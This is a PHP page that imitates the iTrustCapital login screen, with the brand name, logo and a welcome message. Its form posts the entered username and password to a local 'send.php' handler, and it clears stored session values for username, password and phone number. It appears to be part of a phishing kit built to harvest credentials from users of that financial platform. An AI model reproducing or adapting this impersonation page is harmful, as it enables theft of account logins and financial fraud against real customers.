<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['username']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'Log in | iTrustCapital';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container'>
            <div class="row justify-content-center mt60">
                <div class='col-sm-4 shadow-lg p25'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.jpg') ?> width="140" alt="Logo" class="d-inline-block align-text-top" />
                        <h1 class='h4 fw-normal py15'>Welcome</h1>
                        <div class='fs13 py10'>Log in to iTrustCapital to continue to iTrustCapital.</div>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="my25">
                            <input name="username" type="text" minlength="3" maxlength="50" required="" class="form-control form-control-lg fs14 lh30" placeholder="Username or email address" value="" >
                        </div>
                        <div class="my25">
                            <input name="password" type="password" required="" minlength="3" maxlength="50" class="form-control form-control-lg fs14 lh30" placeholder="Password" value="">
                        </div>
                        <div class="row text-start">
                            <div class='col-sm-12'>
                                <a href="#" class='btn btn-link text-success text-decoration-none fw-bold' >Forgot password?</a>
                            </div>
                        </div>
                        <div class="text-center mx-auto d-grid gap-2 my15">
                            <button type="submit" class="btn btn-primary-2 btn-lg btn-block rounded-0 fs14 lh30">Continue</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>